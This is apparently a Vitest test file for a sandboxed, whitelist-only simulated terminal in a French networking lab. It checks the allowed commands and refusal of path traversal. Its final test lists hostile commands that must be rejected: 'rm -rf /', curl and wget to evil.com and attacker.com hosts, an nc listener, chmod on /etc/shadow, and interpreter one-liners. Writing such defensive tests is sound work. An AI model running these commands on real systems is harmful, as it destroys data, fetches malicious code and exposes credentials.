import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import * as os from 'node:os';
import * as path from 'node:path';
import * as fs from 'node:fs';
import { SimulationCommandInterpreter } from '../services/simulation-command-interpreter.service';
import { SimulatedNetworkService } from '../services/simulated-network.service';
import { SimulatedFilesystemService } from '../services/simulated-filesystem.service';

describe('SimulationCommandInterpreter (Sécurité & Liste Blanche)', () => {
  let interpreter: SimulationCommandInterpreter;
  let testWorkDir: string;
  const testSessionId = 'test-session-1234';

  beforeEach(() => {
    const networkService = new SimulatedNetworkService();
    const fsService = new SimulatedFilesystemService();
    interpreter = new SimulationCommandInterpreter(networkService, fsService);
    testWorkDir = path.join(os.tmpdir(), `test-opensio-term-${Date.now()}`);
    fs.mkdirSync(testWorkDir, { recursive: true });
    fs.writeFileSync(path.join(testWorkDir, 'test.txt'), 'Hello OpenSIO Lab');
    fs.mkdirSync(path.join(testWorkDir, 'subdir'));
    fs.writeFileSync(path.join(testWorkDir, 'subdir', 'sub.txt'), 'Subdir file');
  });

  afterEach(() => {
    if (fs.existsSync(testWorkDir)) {
      fs.rmSync(testWorkDir, { recursive: true, force: true });
    }
  });

  it('exécute les commandes d’aide et de navigation autorisées (help, pwd, whoami, hostname)', async () => {
    const helpRes = await interpreter.interpret(testSessionId, 'help', testWorkDir);
    expect(helpRes.exitCode).toBe(0);
    expect(helpRes.stdout).toContain('OpenSIO — Terminal Virtuel');

    const pwdRes = await interpreter.interpret(testSessionId, 'pwd', testWorkDir);
    expect(pwdRes.exitCode).toBe(0);
    expect(pwdRes.stdout).toContain('/home/student');

    const whoRes = await interpreter.interpret(testSessionId, 'whoami', testWorkDir);
    expect(whoRes.exitCode).toBe(0);
    expect(whoRes.stdout).toBe('student');

    const hostRes = await interpreter.interpret(testSessionId, 'hostname', testWorkDir);
    expect(hostRes.exitCode).toBe(0);
    expect(hostRes.stdout).toContain('opensio-lab-test');
  });

  it('exécute ls et cat de façon sécurisée à l’intérieur du bac à sable', async () => {
    const lsRes = await interpreter.interpret(testSessionId, 'ls -la', testWorkDir);
    expect(lsRes.exitCode).toBe(0);
    expect(lsRes.stdout).toContain('test.txt');
    expect(lsRes.stdout).toContain('subdir/');

    const catRes = await interpreter.interpret(testSessionId, 'cat test.txt', testWorkDir);
    expect(catRes.exitCode).toBe(0);
    expect(catRes.stdout).toBe('Hello OpenSIO Lab');
  });

  it('gère cd et la navigation relative sans sortir du sandbox', async () => {
    const cdSubRes = await interpreter.interpret(testSessionId, 'cd subdir', testWorkDir);
    expect(cdSubRes.exitCode).toBe(0);
    expect(cdSubRes.cwd).toBe('subdir');

    const catSubRes = await interpreter.interpret(testSessionId, 'cat sub.txt', testWorkDir);
    expect(catSubRes.exitCode).toBe(0);
    expect(catSubRes.stdout).toBe('Subdir file');

    // Tentative de path traversal pour sortir du sandbox
    const cdEscapeRes = await interpreter.interpret(testSessionId, 'cd ../../../..', testWorkDir);
    expect(cdEscapeRes.exitCode).toBe(1);
    expect(cdEscapeRes.stderr).toContain('permission non accordée');
  });

  it('simule les commandes réseau BTS SISR (ip a, ip route, ping, ss, netstat)', async () => {
    const ipRes = await interpreter.interpret(testSessionId, 'ip a', testWorkDir);
    expect(ipRes.exitCode).toBe(0);
    expect(ipRes.stdout).toContain('eth0');
    expect(ipRes.stdout).toContain('192.168.1.');

    const routeRes = await interpreter.interpret(testSessionId, 'ip route', testWorkDir);
    expect(routeRes.exitCode).toBe(0);
    expect(routeRes.stdout).toContain('default via 192.168.1.254');

    const pingRes = await interpreter.interpret(testSessionId, 'ping 192.168.1.254', testWorkDir);
    expect(pingRes.exitCode).toBe(0);
    expect(pingRes.stdout).toContain('0% packet loss');

    const ssRes = await interpreter.interpret(testSessionId, 'ss -tuln', testWorkDir);
    expect(ssRes.exitCode).toBe(0);
    expect(ssRes.stdout).toContain('LISTEN');
  });

  it('simule les commandes système (systemctl status, uname, df, free, ps)', async () => {
    const sysRes = await interpreter.interpret(testSessionId, 'systemctl status bind9', testWorkDir);
    expect(sysRes.exitCode).toBe(0);
    expect(sysRes.stdout).toContain('active (running)');

    const unameRes = await interpreter.interpret(testSessionId, 'uname -a', testWorkDir);
    expect(unameRes.exitCode).toBe(0);
    expect(unameRes.stdout).toContain('Linux');

    const dfRes = await interpreter.interpret(testSessionId, 'df -h', testWorkDir);
    expect(dfRes.exitCode).toBe(0);
    expect(dfRes.stdout).toContain('/dev/root');
  });

  it('SÉCURITÉ CRITIQUE : rejette immédiatement toute commande hors liste blanche (zéro exec shell)', async () => {
    const forbiddenCommands = [
      'rm -rf /',
      'curl http://evil.com/malware.sh',
      'wget http://attacker.com',
      'python3 -c "import os; os.system(\'ls\')"',
      'node -e "console.log(process.env)"',
      'bash',
      'sh',
      'nc -lvnp 4444',
      'sudo rm -rf /',
      'chmod 777 /etc/shadow',
    ];

    for (const cmd of forbiddenCommands) {
      const res = await interpreter.interpret(testSessionId, cmd, testWorkDir);
      expect(res.exitCode).toBe(127);
      expect(res.stderr).toContain('commande non autorisée en mode simulation');
      expect(res.stdout).toBe('');
    }
  });
});
